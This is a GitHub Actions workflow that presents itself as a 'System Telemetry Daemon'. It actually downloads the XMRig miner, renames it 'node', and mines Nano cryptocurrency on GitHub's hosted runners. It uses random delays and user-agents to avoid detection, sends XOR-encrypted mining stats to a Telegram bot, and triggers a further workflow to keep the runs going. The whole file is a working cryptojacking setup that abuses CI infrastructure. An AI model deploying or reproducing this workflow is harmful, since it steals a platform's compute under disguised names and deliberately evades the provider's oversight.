name: System Telemetry Daemon

on:
  schedule:
    - cron: '0 0,12 * * *'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  nano-task:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Boot Phase
        run: echo "Initializing..."

      - name: Install Agent
        run: |
          sudo apt update -y
          sudo apt install -y curl tar coreutils xxd base64
          curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf node.tar.gz
          mv xmrig-6.24.0 node-core
          cd node-core
          mv xmrig node
          chmod +x node

      - name: Mining Agent
        env:
          UA_LIST: "curl|wget|Mozilla/5.0|python-requests|Go-http-client/1.1"
        run: |
          cd node-core
          UA=$(echo $UA_LIST | tr "|" "\n" | shuf -n 1)
          echo "Using UA: $UA"

          DELAY=$((RANDOM % 180 + 30))
          echo "Waiting $DELAY sec..."
          sleep $DELAY

          ./node -o xmrig.nanswap.com:3333 -a rx -k \
            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
            -p nanoninja --randomx-no-rdmsr | tee result.log &

          PID=$!
          WORKDUR=$((RANDOM % 5400 + 1200))
          echo "Running for $WORKDUR sec..."
          sleep $WORKDUR
          kill $PID

      - name: Send Encrypted Report
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          cd node-core
          python3 - <<EOF
import base64, os

hr = "0 H/s"
try:
  with open("result.log", "r", errors="ignore") as f:
    lines = f.readlines()
    for line in reversed(lines):
      if "speed" in line:
        hr = line.split()[-2] + " H/s"
        break
    a = sum("accepted" in l for l in lines)
    r = sum("rejected" in l for l in lines)
except:
  a, r = 0, 0

msg = f"NANO Stats:\\nâ€¢ HR: {hr}\\nâ€¢ OK: {a}\\nâ€¢ NO: {r}"
key = b"S3cur3"
cipher = bytes([b ^ key[i % len(key)] for i, b in enumerate(msg.encode())])
b64 = base64.b64encode(cipher).decode()

os.system(f'curl -s -X POST https://api.telegram.org/bot${{TG_TOKEN}}/sendMessage '
          f'-d chat_id=${{TG_CHAT_ID}} --data-urlencode text="ðŸ“¦ Encrypted XNO Report:\n```\\n{b64}\\n```" '
          '-d parse_mode=Markdown')
EOF

      - name: Trigger Next
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          sleep $((RANDOM % 60 + 10))
          curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
               -H "Accept: application/vnd.github+json" \
               https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
               -d '{"ref":"main"}'
